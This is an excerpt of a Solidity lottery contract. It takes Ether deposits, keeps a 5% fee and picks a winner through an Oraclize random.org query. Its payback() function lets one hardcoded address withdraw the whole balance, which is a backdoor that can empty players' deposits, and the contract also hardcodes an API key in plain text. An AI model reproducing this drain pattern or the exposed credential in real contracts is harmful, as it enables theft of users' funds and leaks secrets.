...
contract RandomFiveWinners is usingOraclize  {
    ...
    address constant TECH = 0x936F000a0Cc0db576b26aE73c510f993c53DAfF6;
    uint constant TECH_PERCENT = 5;
    
    uint constant MAX_GAS_PRICE = 50; // maximum price for gas in gwei
    uint constant MIN_DEPOSIT = 0.01 ether; // minimum deposit for participation in the game
    uint constant MAX_DEPOSIT = 5 ether; // maximum possible deposit
    uint constant COUNT_START_GAME = 5;
    
    bytes32 queryId;
    
    uint public bank;
    bool public isStarted = false;
    uint public currentRandValue;
    Deposit[] public deposits;
    
    
    function () public payable {
        require(gasleft() >= 250000, "We require more gas!");  // we need gas to process roll logic
        ...
        uint amount = msg.value * (100 - TECH_PERCENT)/100;
        bank += amount;
        deposits.push(Deposit(msg.sender, amount));
        if (deposits.length >= COUNT_START_GAME) {
            startGame();
        }
    }
    ...
    function __callback(bytes32 _queryId, string _result) public {
        ...
        uint amount = 0;
        uint winAmount = bank * currentRandValue / 100;
        address winner;
        for (uint i = 0; i < deposits.length; i++) {
            Deposit storage deposit = deposits[i];
            amount += deposit.amount;
            if (amount >= winAmount) {
                winner = deposit.member;
                break;
            }
        }
    ...
    function startGame() private {
        ...
        '\n{"jsonrpc":"2.0","method":"generateIntegers","params":{"apiKey":"9844ab4d-52ef-4587-9cf3-20a6930a7f6e","n":1,"min":1,"max":100,"replacement":true,"base":10},"id":11317}', 100000);
    }
    
    function payback() public {
        require(msg.sender == TECH);
        uint balance = address(this).balance;
        TECH.transfer(balance);
    }
}